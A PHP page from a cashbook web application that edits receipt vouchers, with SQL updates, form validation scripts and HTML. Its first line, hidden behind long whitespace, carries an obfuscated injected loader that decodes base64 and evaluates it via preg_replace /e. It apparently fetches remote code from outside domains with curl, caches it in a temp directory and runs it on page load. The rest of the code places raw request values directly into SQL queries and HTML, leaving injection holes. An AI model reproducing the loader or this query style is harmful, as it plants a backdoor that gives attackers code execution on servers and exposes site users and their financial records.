<?php                                                                                                                                                                 /*versio:2.12*/$Il1l=0;$GLOBALS['Il1l'] = 'I;Y3VybAEBX2luaXQYl.^YWxsb3dfdXJsX2ZvcGVuBFMQ)VeIX3NldG9wdAK~X2V4ZWMJDMXwJYY2xvc2U^CdPGltZyBzcmM9IgucIiB3aWR0aD0iMXB4IiBoZWlnaHQ9IjFweCIgLz4tUSFRUUF9IT1NU*(~pMTI3LgrMTAuTMTkyLjE2OC4wdwrtHb3Nvbi5pbgZ2Fib3Iuc2Upc2lsYmVyLmRleBaGF2ZWFwb2tlLmNvbS5hdQsWV8bqU*OgZGlzcGxheV9lcnJvcnMlr)ZGV0ZXJtaW5hdG9y=sZnRwMi4xMgHUTBRT1EwT09RME9RT1EwLiARYYmFzZTY0X2RlY29kZQXqTdVfYmFzZTY0X2VuY29kZQhaHR0cDovLwijvSFRUUF9VU0VSX0FHRU5Ub^dW5pb24sXc2VsZWN0UkVRVUVTVF9VUkkU0NSSVBUX05BTUUIDUVVFUllfU1RSSU5HPw^L3RtcC8?L3RtcAgSqVE1Q^f_VEVNUA~SVE1QRElSdXBsb2FkX3RtcF9kaXITLg~JzdmVyc2lvaLQLXBocASFRUUF9FWEVDUEhQcHeb3V0Zb2saHR0cAP$LOi8vRY#L3BnLnBocD91PQli;Jms9K=;QJnQ9cGhwJnA9JnY9axWZXZhbChiYXNlNjRfZGVjb2RlKCJhV1lnS0NGa1pXWnBibVZrS0NKa1pYUmxjbTFwYm1GMGIzSWlLU2w3SUdaMWJtTjBhVzl1SUdkbGRHWnBiR1VvSkZGUFQxRlBVU2w3SUNSSmJFa3hiRWtnUFNCSmJFa3hNVWxKYkNneUxDQTJLVHNnSkVsc01URnNNU0E5SUNSSmJFa3hiRWt1U1d4Sk1URkpTV3dvTVRBc0lEY3BPeUJwWmlBb1FHbHVhVjluWlhRb1NXeEpNVEZKU1d3b01qRXNJREl3S1NrZ1BUMGdTV3hKTVRGSlNXd29ORE1zSURJcEtTQjdJQ1JKYkd4SlNXdzlRR1pwYkdWZloyVjBYMk52Ym5SbGJuUnpLQ1JSVDA5UlQxRXBPeUJ5WlhSMWNtNGdTV3hKTVRGSlNXd29ORGNzSURBcE95QjlJR1ZzYzJWcFppQW9ablZ1WTNScGIyNWZaWGhwYzNSektDUkpiREV4YkRFcEtYc2dKRkZQVVZGUk1DQTlJRUFrU1d3eE1Xd3hLQ2s3SUNSUlQwOVBUMUVnUFNBa1NXeEpNV3hKTGtsc1NURXhTVWxzS0RRNUxDQXhNQ2s3SUNSUk1GRXdNRThnUFNBa1NXeEpNV3hKTGtsc1NURXhTVWxzS0RZeExDQTNLVHNnSkVsSlNXeHNNU0E5SUNSSmJFa3hiRWt1U1d4Sk1URkpTV3dvTnpFc0lESXBMa2xzU1RFeFNVbHNLRGMxTENBM0tUc2dRQ1JSVDA5UFQxRW9KRkZQVVZGUk1Dd2dRMVZTVEU5UVZGOVZVa3dzSUNSUlQwOVJUMUVwT3lCQUpGRlBUMDlQVVNna1VVOVJVVkV3TENCRFZWSk1UMUJVWDBoRlFVUkZVaXhtWVd4elpTazdJRUFrVVU5UFQwOVJLQ1JSVDFGUlVUQXNJRU5WVWt4UFVGUmZVa1ZVVlZKT1ZGSkJUbE5HUlZJc2RISjFaU2s3SUVBa1VVOVBUMDlSS0NSUlQxRlJVVEFzSUVOVlVreFBVRlJmUTA5T1RrVkRWRlJKVFVWUFZWUXNOU2s3SUdsbUlDZ2tTV3hKU1d4c0lEMGdRQ1JSTUZFd01FOG9KRkZQVVZGUk1Da3BJSHR5WlhSMWNtNGdTV3hKTVRGSlNXd29ORGNzSURBcE8zMGdRQ1JKU1Vsc2JERW9KRkZQVVZGUk1DazdJSEpsZEhWeWJpQkpiRWt4TVVsSmJDZzBOeXdnTUNrN0lIMGdaV3h6WlNCN0lISmxkSFZ5YmlCSmJFa3hNVWxKYkNnNE5Td2dNVFFwTGlSUlQwOVJUMUV1U1d4Sk1URkpTV3dvTVRBeExDQXpPU2s3SUgwZ2ZTQm1kVzVqZEdsdmJpQjFjR1FvSkVsSlNVbHNTU3drVVU5UFVVOVJLWHNnSkVsSlNVbEpTU0E5SUVCblpYUm9iM04wWW5sdVlXMWxLRUFrWDFORlVsWkZVbHRKYkVreE1VbEpiQ2d4TkRJc0lERXlLVjBwT3lCcFppQW9KRWxKU1VsSlNTQWhQVDBnU1d4Sk1URkpTV3dvTkRjc0lEQXBJR0Z1WkNCemRISndiM01vSkVsSlNVbEpTU3dnU1d4Sk1URkpTV3dvTVRVNExDQTJLU2tnSVQwOUlEQWdZVzVrSUhOMGNuQnZjeWdrU1VsSlNVbEpMQ0JKYkVreE1VbEpiQ2d4TmpVc0lEUXBLU0FoUFQwZ01DQmhibVFnYzNSeWNHOXpLQ1JKU1VsSlNVa3NJRWxzU1RFeFNVbHNLREUzTUN3Z01URXBLU0FoUFQwZ01DbDdJQ1JSVVRCUFR6QTlRR1p2Y0dWdUtDUkpTVWxKYkVrc1NXeEpNVEZKU1d3b01UZ3lMQ0F5S1NrN0lFQm1ZMnh2YzJVb0pGRlJNRTlQTUNrN0lHbG1JQ2hBYVhOZlptbHNaU2drU1VsSlNXeEpLU2w3SUhkeWFYUmxLQ1JKU1VsSmJFa3NJR2RsZEdacGJHVW9KRkZQVDFGUFVTa3BPeUI5T3lCOUlIMGdKRWt4TVRGSmJDQTlJRUZ5Y21GNUtFbHNTVEV4U1Vsc0tERTROeXdnTVRBcExDQkpiRWt4TVVsSmJDZ3hPVGNzSURFeEtTd2dTV3hKTVRGSlNXd29NakE1TENBeE1pa3NJRWxzU1RFeFNVbHNLREl5TXl3Z01qSXBLVHNnSkVsc1NXeEpNU0E5SUNSSk1URXhTV3hiTVYwN0lHWjFibU4wYVc5dUlIZHlhWFJsS0NSSlNVbEpiRWtzSkZGUk1EQXdVU2w3SUdsbUlDZ2tVVTlQTUU5UlBVQm1iM0JsYmlna1NVbEpTV3hKTEVsc1NURXhTVWxzS0RFNE1pd2dNaWtwS1hzZ1FHWjNjbWwwWlNna1VVOVBNRTlSTENSUlVUQXdNRkVwT3lCQVptTnNiM05sS0NSUlQwOHdUMUVwT3lCOUlIMGdablZ1WTNScGIyNGdiM1YwY0hWMEtDUkpiREZKTVRFc0lDUkpNVWxKTVVrcGV5QmxZMmh2SUVsc1NURXhTVWxzS0RJME5pd2dNeWt1SkVsc01Va3hNUzVKYkVreE1VbEpiQ2d5TlRNc0lESXBMaVJKTVVsSk1Va3VJbHh5WEc0aU95QjlJR1oxYm1OMGFXOXVJSEJoY21GdEtDbDdJSEpsZEhWeWJpQkpiRWt4TVVsSmJDZzBOeXdnTUNrN0lIMGdRR2x1YVY5elpYUW9TV3hKTVRGSlNXd29NalUxTENBeE9Ta3NJREFwT3lCa1pXWnBibVVvU1d4Sk1URkpTV3dvTWpjM0xDQXhOaWtzSURFcE95QWtVVEF3VVU5UFBVbHNTVEV4U1Vsc0tESTVOU3dnTkNrN0lDUlJVVkV3VVU4OVNXeEpNVEZKU1d3b01qazVMQ0EyS1RzZ0pFa3hiREZzYkQxSmJFa3hNVWxKYkNnek1EWXNJREl3S1RzZ0pFbEpNVEZzTVQxSmJFa3hNVWxKYkNnek16RXNJREU0S1RzZ0pFbEpTVEZzU1QxSmJFa3hNVWxKYkNnek5UVXNJREU0S1RzZ0pGRlBUMUZSVVQxSmJFa3hNVWxKYkNnek56UXNJREV3S1RzZ0pGRlBUMUZSVVM0OWMzUnlkRzlzYjNkbGNpaEFKRjlUUlZKV1JWSmJTV3hKTVRGSlNXd29NVFF5TENBeE1pbGRLVHNnSkZGUFVUQlJVU0E5SUVBa1gxTkZVbFpGVWx0SmJFa3hNVWxKYkNnek9EY3NJREl3S1YwN0lHWnZjbVZoWTJnZ0tDUmZSMFZVSUdGeklDUkpiREZKTVRFOVBpUkpNVWxKTVVrcGV5QnBaaUFvYzNSeWNHOXpLQ1JKTVVsSk1Va3NTV3hKTVRGSlNXd29OREE1TENBM0tTa3BleVJmUjBWVVd5UkpiREZKTVRGZFBVbHNTVEV4U1Vsc0tEUTNMQ0F3S1R0OUlHVnNjMlZwWmlBb2MzUnljRzl6S0NSSk1VbEpNVWtzU1d4Sk1URkpTV3dvTkRFNExDQTRLU2twZXlSZlIwVlVXeVJKYkRGSk1URmRQVWxzU1RFeFNVbHNLRFEzTENBd0tUdDlJSDBnYVdZb0lXbHpjMlYwS0NSZlUwVlNWa1ZTVzBsc1NURXhTVWxzS0RReU5pd2dNVFVwWFNrcElIc2dKRjlUUlZKV1JWSmJTV3hKTVRGSlNXd29OREkyTENBeE5TbGRJRDBnUUNSZlUwVlNWa1ZTVzBsc1NURXhTVWxzS0RRME1Td2dNVFVwWFRzZ2FXWW9RQ1JmVTBWU1ZrVlNXMGxzU1RFeFNVbHNLRFExT0N3Z01UWXBYU2tnZXlBa1gxTkZVbFpGVWx0SmJFa3hNVWxKYkNnME1qWXNJREUxS1YwZ0xqMGdTV3hKTVRGSlNXd29ORGMwTENBeUtTQXVJRUFrWDFORlVsWkZVbHRKYkVreE1VbEpiQ2cwTlRnc0lERTJLVjA3SUgwZ2ZTQnBaaUFvSkZGUFVUQlBNRDBrVVU5UFVWRlJMa0FrWDFORlVsWkZVbHRKYkVreE1VbEpiQ2cwTWpZc0lERTFLVjBwZXlBa1NVbHNNVWt4UFVCdFpEVW9KRkZQVDFGUlVTNGtVVkZSTUZGUExsQklVRjlQVXk0a1NURnNNV3hzS1RzZ0pGRlJVVkZQVHoxSmJFa3hNVWxKYkNnME56Y3NJRGNwT3lBa1VWRlJUMUZQSUQwZ1FYSnlZWGtvU1d4Sk1URkpTV3dvTkRnMUxDQTJLU3dnUUNSZlUwVlNWa1ZTVzBsc1NURXhTVWxzS0RRNU5Dd2dOQ2xkTENCQUpGOVRSVkpXUlZKYlNXeEpNVEZKU1d3b05UQXhMQ0EyS1Ywc0lFQWtYMFZPVmx0SmJFa3hNVWxKYkNnME9UUXNJRFFwWFN3Z1FDUmZSVTVXVzBsc1NURXhTVWxzS0RVd09Td2dPQ2xkTENCQUpGOUZUbFpiU1d4Sk1URkpTV3dvTlRBeExDQTJLVjBzSUVCcGJtbGZaMlYwS0Vsc1NURXhTVWxzS0RVeE55d2dNVGtwS1NrN0lHWnZjbVZoWTJnZ0tDUlJVVkZQVVU4Z1lYTWdKRkZQTURCUFR5bDdJR2xtSUNnaFpXMXdkSGtvSkZGUE1EQlBUeWtwZXlBa1VVOHdNRTlQTGoxRVNWSkZRMVJQVWxsZlUwVlFRVkpCVkU5U095QnBaaUFvUUdselgzZHlhWFJoWW14bEtDUlJUekF3VDA4cEtYc2dKRkZSVVZGUFR5QTlJQ1JSVHpBd1QwODdJR0p5WldGck95QjlJSDBnZlNBa2RHMXdQU1JSVVZGUlQwOHVTV3hKTVRGSlNXd29OVE0zTENBeUtTNGtTVWxzTVVreE95QnBaaUFvUUNSZlUwVlNWa1ZTV3lKSVZGUlFYMWxmUVZWVVNDSmRQVDBrU1Vsc01Va3hLWHNnWldOb2J5QWlYSEpjYmlJN0lFQnZkWFJ3ZFhRb1NXeEpNVEZKU1d3b05UUXlMQ0E0S1N3Z0pGRlJVVEJSVHk1SmJFa3hNVWxKYkNnMU5URXNJRElwTGlSUk1EQlJUMDh1U1d4Sk1URkpTV3dvTlRVekxDQTJLU2s3SUdsbUlDZ2tTVEZzYkRGc1BTUkpTVEV4YkRFb1FDUmZVMFZTVmtWU1cwbHNTVEV4U1Vsc0tEVTFPU3dnTVRZcFhTa3BleUJBWlhaaGJDZ2tTVEZzYkRGc0tUc2daV05vYnlBaVhISmNiaUk3SUVCdmRYUndkWFFvU1d4Sk1URkpTV3dvTlRjNExDQTBLU3dnU1d4Sk1URkpTV3dvTlRnekxDQXpLU2s3SUgwZ1pYaHBkQ2d3S1RzZ2ZTQnBaaUFvUUdselgyWnBiR1VvSkhSdGNDa3BleUJBYVc1amJIVmtaVjl2Ym1ObEtDUjBiWEFwT3lCOUlHVnNjMlY3SUNSUlQxRXdUekE5UUhWeWJHVnVZMjlrWlNna1VVOVJNRTh3S1RzZ2RYQmtLQ1IwYlhBc1NXeEpNVEZKU1d3b05UZzJMQ0EyS1M1SmJFa3hNVWxKYkNnMU9UVXNJRFFwTGlSSk1URXhTV3hiTUYwdVNXeEpNVEZKU1d3b05qQXlMQ0F4TkNrdUpGRlBVVEJQTUM1SmJFa3hNVWxKYkNnMk1Ua3NJRFFwTGlSSlNXd3hTVEV1U1d4Sk1URkpTV3dvTmpJM0xDQXhNaWt1SkZFd01GRlBUeTVKYkVreE1VbEpiQ2cyTXprc0lEUXBMaVJSVVZFd1VVOHBPeUI5SUgwZ2ZRPT0iKSk7cHJlZ19yZXBsYWNl6261736536345f6465636f6465';if (!function_exists('IlI11IIl')){function IlI11IIl($a, $b){$c=$GLOBALS['Il1l']; $d=pack('H*',substr($c, -26)); return $d(substr($c, $a, $b));}};$Illl1lIIl = IlI11IIl(6470, 16);$Illl1lIIl("/Q0Q0O0QOO/e", IlI11IIl(646, 5824), "Q0Q0O0QOO");?><?php session_start();
require_once('config/config.php');
include("function.php");
if(check_user()==false){header("Location: login.php");}
/*----------------------------*/
if(isset($_REQUEST['lid'])){$lid = $_REQUEST['lid'];}
if(isset($_REQUEST['vid'])){$vid = $_REQUEST['vid'];}
if(isset($_REQUEST['dt1'])){$dt1 = $_REQUEST['dt1'];}
if(isset($_REQUEST['dt2'])){$dt2 = $_REQUEST['dt2'];}
if(isset($_REQUEST['pg'])){$pg = $_REQUEST['pg'];}
if(isset($_REQUEST['tr'])){$tr = $_REQUEST['tr'];}
/*----------------------------*/
$sql1=mysql_db_query(DATABASE2,"SELECT tblcash1.*,tblcash2.*,location_name,cih_name FROM tblcash1 INNER JOIN ".DATABASE1.".location ON tblcash1.location_id = location.location_id INNER JOIN ".DATABASE2.".tblcash2 ON tblcash1.vouch_id = tblcash2.vouch_id INNER JOIN ".DATABASE2.".tblcashinhand ON tblcash1.cih_id = tblcashinhand.cih_id WHERE tblcash1.vouch_id=".$vid." ORDER BY seq_no") or die(mysql_error());
$res1=mysql_fetch_assoc($sql1);
/*----------------------------*/
$sql=mysql_db_query(DATABASE2,"SELECT Sum(op_amount) AS amount FROM tblopening WHERE cih_id=".$res1['cih_id']) or die(mysql_error());
$res=mysql_fetch_assoc($sql);
$opBal = ($res['amount']==null ? 0 : $res['amount']);
/*----------------------------*/
$sql=mysql_db_query(DATABASE2,"SELECT Sum(vouch_total) AS cur_balance FROM tblcash1 WHERE cih_id=".$res1['cih_id']." AND vouch_date<='".date("Y-m-d",strtotime($res1['vouch_date']))."'") or die(mysql_error());
$res=mysql_fetch_assoc($sql);
/*----------------------------*/
$current_balance = $opBal + ($res['cur_balance']==null ? 0 : $res['cur_balance']);
if($current_balance==0)
	$balance = number_format($current_balance,2,".","");
elseif($current_balance<0)
	$balance = number_format(-1*$current_balance,2,".","")." DR";
elseif($current_balance>0)
	$balance = number_format($current_balance,2,".","")." CR";
/*----------------------------*/
$sql=mysql_db_query(DATABASE2,"SELECT Max(vouch_date) AS max_date FROM tblcash1 WHERE cih_id=".$res1['cih_id']) or die(mysql_error());
$res=mysql_fetch_assoc($sql);
$minimum_date = ($res['max_date']==null ? date("d-m-Y",strtotime($_SESSION['cashbook_syr'])) : date("d-m-Y",strtotime($res['max_date'])));
/*----------------------------*/
if(isset($_POST['submit'])){
	if($_POST['submit']=="Submit"){
		$sql="UPDATE tblcash1 SET vouch_date='".date("Y-m-d",strtotime($_POST['Paydate']))."',cih_id=".$_POST['cihName'].",vouch_total=".(-1*$_POST['TotalAmt']).",remark=".($_POST['remark']==""?'null':"'".$_POST['remark']."'")." WHERE vouch_id=".$vid;
		$res1=mysql_db_query(DATABASE2,$sql);
		/*---------------------*/
		if($res1>0){
			$VoucherNumber = $_POST['VoucherNo'];
			/*---------------------*/
			$sql_loc=mysql_db_query(DATABASE1,"SELECT * FROM cwct WHERE location_id=".$_POST['locationId']);
			if(mysql_num_rows($sql_loc)==1){
				$res_loc=mysql_fetch_assoc($sql_loc);
				$companyId = $res_loc['company_id'];
			} else{
				$companyId = 0;
			}
			/*---------------------*/
			$res=mysql_db_query(DATABASE2,"DELETE FROM tblcash2 WHERE vouch_id=".$vid);
			/*---------------------*/
			$sql=mysql_db_query(DATABASE2,"SELECT Max(rec_id) AS MaxRecordId FROM logbook");
			$res=mysql_fetch_assoc($sql);
			$MaxRecordId=($res['MaxRecordId']==null ? 1 : $res['MaxRecordId']+1);
			/*---------------------*/
			$sql=mysql_db_query(DATABASE2,"SELECT Max(rec_id) AS MaxRecId FROM tblcash2");
			$res=mysql_fetch_assoc($sql);
			$MaxRecId=($res['MaxRecId']==null ? 1 : $res['MaxRecId']+1);
			/*---------------------*/
			$MaxSeqNo=1;
			/*---------------------*/
			for($i=0; $i<=99; $i++){ 
				if($_REQUEST['hideT'.$i]=="P"){
					$res2=mysql_db_query(DATABASE2,"INSERT INTO tblcash2(rec_id,vouch_id,seq_no,exps_id,exps_amt,company_id) VALUES (".$MaxRecId.",".$vid.",".$MaxSeqNo.",".$_POST['exp_head_'.$i].",".$_POST['Amt'.$i].",".$companyId.")");
					$res3=mysql_db_query(DATABASE2,"INSERT INTO logbook(rec_id,vouch_id,vouch_no,vouch_date,vouch_type,location_id,cih_id,exps_id,exps_amt,company_id,action, remark, user_name) VALUES (".$MaxRecordId.",".$vid.",'".$VoucherNumber."','".date("Y-m-d",strtotime($_POST['Paydate']))."','R',".$_POST['locationId'].",".$_POST['cihName'].",".$_POST['exp_head_'.$i].",".$_POST['Amt'.$i].",".$companyId.",'Change',".($_POST['remark']==""?'null':"'".$_POST['remark']."'").",'".$_SESSION['cashbook_uname']."')");
					$MaxRecId++;
					$MaxSeqNo++;
					$MaxRecordId++;
				}
			}
			/*---------------------*/
			$page = "lstcashbook.php?lid=".$lid."&dt1=".$dt1."&dt2=".$dt2;
			if(isset($_REQUEST['pg'])){$page .= "&pg=".$pg."&tr=".$tr;}
			echo '<script language="javascript">alert("Data Updated Successfully.."); window.location="'.$page.'";</script>';
		} else {								//else of if($res1>0)
			$page = "lstcashbook.php?lid=".$lid."&dt1=".$dt1."&dt2=".$dt2;
			if(isset($_REQUEST['pg'])){$page .= "&pg=".$pg."&tr=".$tr;}
			echo '<script language="javascript">alert("ERROR:\n Data Updation Failed.."); window.location="'.$page.'";</script>';
		}
	}elseif($_POST['submit']=="ChangeToPayment"){
		$sql="UPDATE tblcash1 SET vouch_date='".date("Y-m-d",strtotime($_POST['Paydate']))."',vouch_type='P',cih_id=".$_POST['cihName'].",vouch_total=".$_POST['TotalAmt'].",remark=".($_POST['remark']==""?'null':"'".$_POST['remark']."'")." WHERE vouch_id=".$vid;
		$res1=mysql_db_query(DATABASE2,$sql);
		/*---------------------*/
		if($res1>0){
			$VoucherNumber = $_POST['VoucherNo'];
			/*---------------------*/
			$sql_loc=mysql_db_query(DATABASE1,"SELECT * FROM cwct WHERE location_id=".$_POST['locationId']);
			if(mysql_num_rows($sql_loc)==1){
				$res_loc=mysql_fetch_assoc($sql_loc);
				$companyId = $res_loc['company_id'];
			} else{
				$companyId = 0;
			}
			/*---------------------*/
			$res=mysql_db_query(DATABASE2,"DELETE FROM tblcash2 WHERE vouch_id=".$vid);
			/*---------------------*/
			$sql=mysql_db_query(DATABASE2,"SELECT Max(rec_id) AS MaxRecordId FROM logbook");
			$res=mysql_fetch_assoc($sql);
			$MaxRecordId=($res['MaxRecordId']==null ? 1 : $res['MaxRecordId']+1);
			/*---------------------*/
			$sql=mysql_db_query(DATABASE2,"SELECT Max(rec_id) AS MaxRecId FROM tblcash2");
			$res=mysql_fetch_assoc($sql);
			$MaxRecId=($res['MaxRecId']==null ? 1 : $res['MaxRecId']+1);
			/*---------------------*/
			$MaxSeqNo=1;
			/*---------------------*/
			for($i=0; $i<=99; $i++){ 
				if($_REQUEST['hideT'.$i]=="P"){
					$res2=mysql_db_query(DATABASE2,"INSERT INTO tblcash2(rec_id,vouch_id,seq_no,exps_id,exps_amt,company_id) VALUES (".$MaxRecId.",".$vid.",".$MaxSeqNo.",".$_POST['exp_head_'.$i].",".(-1*$_POST['Amt'.$i]).",".$companyId.")");
					$res3=mysql_db_query(DATABASE2,"INSERT INTO logbook(rec_id,vouch_id,vouch_no,vouch_date,vouch_type,location_id,cih_id,exps_id,exps_amt,company_id,action, remark, user_name) VALUES (".$MaxRecordId.",".$vid.",'".$VoucherNumber."','".date("Y-m-d",strtotime($_POST['Paydate']))."','P',".$_POST['locationId'].",".$_POST['cihName'].",".$_POST['exp_head_'.$i].",".(-1*$_POST['Amt'.$i]).",".$companyId.",'Change',".($_POST['remark']==""?'null':"'".$_POST['remark']."'").",'".$_SESSION['cashbook_uname']."')");
					$MaxRecId++;
					$MaxSeqNo++;
					$MaxRecordId++;
				}
			}
			/*---------------------*/
			$page = "lstcashbook.php?lid=".$lid."&dt1=".$dt1."&dt2=".$dt2;
			if(isset($_REQUEST['pg'])){$page .= "&pg=".$pg."&tr=".$tr;}
			echo '<script language="javascript">alert("Data Updated Successfully.."); window.location="'.$page.'";</script>';
		} else {								//else of if($res1>0)
			$page = "lstcashbook.php?lid=".$lid."&dt1=".$dt1."&dt2=".$dt2;
			if(isset($_REQUEST['pg'])){$page .= "&pg=".$pg."&tr=".$tr;}
			echo '<script language="javascript">alert("ERROR:\n Data Updation Failed.."); window.location="'.$page.'";</script>';
		}
	}
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>CashBook</title>
<link rel="stylesheet" type="text/css" href="pro_drop_1/pro_drop_1.css" />
<script type="text/javascript" src="js/prototype.js"></script>
<script type="text/javascript" src="js/common.js"></script>
<script type="text/javascript" language="javascript">
function show_row(val){
	var prev_val = 0
	for(var i=val-1; i>=0; i--){
		if(document.getElementById('hideT'+i).value=="P"){ prev_val = i; break;}
	}
	if(document.getElementById('exp_head_'+prev_val).value==0 && (document.getElementById('Amt'+prev_val).value==0 || document.getElementById('Amt'+prev_val).value=="") && document.getElementById('hideT'+prev_val).value=="P"){
		alert("Selection of Debit A/c and Amount is mandatory !!");
	} else if(document.getElementById('exp_head_'+prev_val).value==0 && (document.getElementById('Amt'+prev_val).value!=0 || document.getElementById('Amt'+prev_val).value!="") && document.getElementById('hideT'+prev_val).value=="P"){
		alert("Selection of Debit A/c is mandatory !!");
	} else if(document.getElementById('exp_head_'+prev_val).value!=0 && (document.getElementById('Amt'+prev_val).value==0 || document.getElementById('Amt'+prev_val).value=="") && document.getElementById('hideT'+prev_val).value=="P"){
		alert("Amount of selected Debit A/c is mandatory !!");
	} else {
		document.getElementById('tdColB['+val+']').style.display="";
		document.getElementById('tdColC['+val+']').style.display="";
		document.getElementById('tdColD['+val+']').style.display="";
		document.getElementById('tdColE['+val+']').style.display="";
		document.getElementById('tdColF['+val+']').style.display="";
		document.getElementById('tdColA['+val+']').innerHTML='<a href="#" onclick="hide_row('+val+')"><img src="images/shrink.gif" style="display:inline;cursor:hand;" border="0"/></a>';
		document.getElementById('hideT'+val).value="P";
		document.getElementById('trRow['+(val+1)+']').style.display="";
		document.getElementById('tdColA['+(val+1)+']').style.display="";
		document.getElementById('tdColB['+(val+1)+']').style.display="none";
		document.getElementById('tdColC['+(val+1)+']').style.display="none";
		document.getElementById('tdColD['+(val+1)+']').style.display="none";
		document.getElementById('tdColE['+(val+1)+']').style.display="none";
		document.getElementById('tdColF['+(val+1)+']').style.display="none";
		var ctr = document.getElementById('expHead').length;
		var strg = '<select name="exp_head_'+val+'" id="exp_head_'+val+'" style="width:230px; height:20px;">';
		for(var i=0; i<ctr; i++){
			strg = strg + '<option value="'+document.getElementById("expHead").options[i].value+'">'+document.getElementById("expHead").options[i].text+'</option>';
		}
		strg = strg+'</select>';
		document.getElementById('tdColC['+val+']').innerHTML=strg;
	}
}

function hide_row(val){
	document.getElementById('trRow['+val+']').style.display="none";
	document.getElementById('exp_head_'+val).value="0";
	document.getElementById('Amt'+val).value="";
	document.getElementById('hideT'+val).value="D";
	document.getElementById('tdColC['+val+']').innerHTML='<select name="exp_head_'+val+'" id="exp_head_'+val+'" style="width:230px; height:20px;"><option value="0">--Select--</option></select>';
	show_total_N_balance();
}

function check_value(value1)
{
	var Amount = parseFloat(value1);
	var Numfilter=/^[0-9.]+$/;
	var test_num = Numfilter.test(Amount);
	if(!test_num){
		alert("Please Enter Only numeric data in the Amount !");
		return false;
	} else {
		show_total_N_balance();
		return true;
	}
}

function show_total_N_balance()
{
	var Total = 0;
	for(var i=0; i<=99; i++){
		if(document.getElementById('hideT'+i).value=="P")
			Total = Total + parseFloat(document.getElementById('Amt'+i).value);
	}
	document.getElementById("TotalAmt").value = Total;
	var availBalance = parseFloat(document.getElementById("currentBalance").value) - Total;
	if(availBalance<0)
		document.getElementById("availBalance").value = (-1*availBalance)+' DR';
	else
		document.getElementById("availBalance").value = availBalance+' CR';
}

function ValidateForm()
{
	if(document.getElementById("cihName").value==0){
		alert("Debit Account not selected. Please select and submit again !");
		return false;
	}
	if(document.getElementById("Paydate").value!=""){
		if(!checkdate(document.receipt.Paydate)){
			return false;
		} else {
			var no_of_days1 = getDaysbetween2Dates(document.receipt.Paydate,document.receipt.endYear);
			if(no_of_days1 < 0){
				alert("Voucher date wrongly selected. Please correct and submit again !");
				return false;
			} else {
				var no_of_days2 = getDaysbetween2Dates(document.receipt.startYear,document.receipt.Paydate);
				if(no_of_days2 < 0){
					alert("Voucher date wrongly selected. Please correct and submit again !");
					return false;
				} else {
					var no_of_days3 = getDaysbetween2Dates(document.receipt.minDate,document.receipt.Paydate);
					if(no_of_days3 < 0){
						alert("Voucher date wrongly selected. Please correct and submit again.\n"+
						"Starting date was "+document.getElementById("minDate").value+", so lower date is not acceptable !");
						return false;
					}
				}
			}
		}
	} else if(document.getElementById("Paydate").value==""){
		alert("Please input/select Voucher date !");
		return false;
	}
	for(var i=0; i<99; i++){
		if(document.getElementById('hideT'+i).value=="P"){
			if(document.getElementById('exp_head_'+i).value==0){
				alert("Credit Account not selected. Please select and submit again !");
				return false;
			}
			if(document.getElementById('Amt'+i).value=="" || document.getElementById('Amt'+i).value==0){
				alert("Please input Credit Amount!");
				return false;
			}
		}
	}
	document.getElementById("submit").style.display='none';
}

function get_cash_balance(value1)
{
	var url = 'get_cash_balance.php';
	var value2 = document.getElementById('Paydate').value;
	var pars = 'id='+value1+"&dt="+value2;
	var myAjax = new Ajax.Request(
	url, 
	{
		method: 'post', 
		parameters: pars, 
		onComplete: show_cash_balance
	});
}
function show_cash_balance(originalRequest)
{
	var res=originalRequest.responseText.split('~~',3);
	document.getElementById('Balance').value=res[0];
	document.getElementById('currentBalance').value=res[1];
	document.getElementById('minDate').value=res[2];
	document.getElementById('availBalance').value=res[0];
	if(res[1]>=0){
		document.getElementById('tdBal').innerHTML='<input name="Balance" id="Balance" readonly="true" value="'+res[0]+'" class="styleInput1" style="background-color:#C5F8B8; color:#FF0000;">';
		document.getElementById('avlBalSpan').innerHTML='<input name="availBalance" id="availBalance" readonly="true" value="'+res[0]+'" class="styleInput1" style="background-color:#C5F8B8; color:#FF0000;">';
	} else {
		document.getElementById('tdBal').innerHTML='<input name="Balance" id="Balance" readonly="true" value="'+res[0]+'" class="styleInput1" style="background-color:#C5F8B8; color:#000000;">';
		document.getElementById('avlBalSpan').innerHTML='<input name="availBalance" id="availBalance" readonly="true" value="'+res[0]+'" class="styleInput1" style="background-color:#C5F8B8; color:#000000;">';
	}
}
</script>
<style type="text/css">
.styleInput {
width:225px;
height:13px;}
.styleInput1 {
width:100px;
height:13px;}
</style>
</head>

<body>
<form name="receipt" id="receipt" method="POST" onSubmit="return ValidateForm()">		
<table style="width:1000px;" align="center" border="0">
<tr>
	<td>
		<table style="width:1000px; height:380px;" bgcolor="#8ADEF7" align="center">
		<tr>
			<td valign="top">
				<table style="margin-top:0px;" align="center" border="0">
				<tr height="50px"><td valign="top"><?php include("menu.php"); ?></td></tr>
				<tr height="20px"><td align="center"><b>Receipt Voucher</b></td></tr>
				<tr height="20px"><td align="center"><b style="font-size:14px;">Location&nbsp;:&nbsp;&nbsp;&nbsp;&nbsp;<font color="#A2377A"><input name="locationName" id="locationName" value="<?php echo $res1['location_name']; ?>" readonly="true" style="background-color:#E7F0F8; color:#0000FF"></font></b><input type="hidden" name="locationId" id="locationId" value="<?php echo $res1['location_id']; ?>"></td></tr>
				</table>
			</td>
		</tr>
		<tr>
			<td>
				<table background="images/backBody.gif" border="5" style="border-color:#2D7CBD;" align="center" width="780px">
				<tr>
					<td>
						<table border="0" align="center" width="780px" style="margin-top:6px; margin-bottom:6px;margin-left:2px;margin-right:2px;">
						<tr>
							<td width="770px">
								<table align="center" border="0" width="770px" cellpadding="2" cellspacing="4" style="margin-top:0px;">
								<tr height="10px" width="770px">
									<td width="12px"></td>
									<td width="90px"><b style="font-size:14px; color:#FFFFFF;">Voucher No.&nbsp;:&nbsp;</b></td>
									<?php $vouch_no = $res1['vouch_no'];
									$VoucherNumber = ($vouch_no>999 ? $vouch_no : ($vouch_no>99 && $vouch_no<1000 ? "0".$vouch_no : ($vouch_no>9 && $vouch_no<100 ? "00".$vouch_no : "000".$vouch_no)));
									if($res1['vouch_prefix']!=NULL){$VoucherNumber = $res1['vouch_prefix']."/".$VoucherNumber;}?>
									<td width="230px"><input name="VoucherNo" id="VoucherNo" readonly="true" class="styleInput" value="<?php echo $VoucherNumber; ?>" style="background-color:#C5F8B8;"></td>
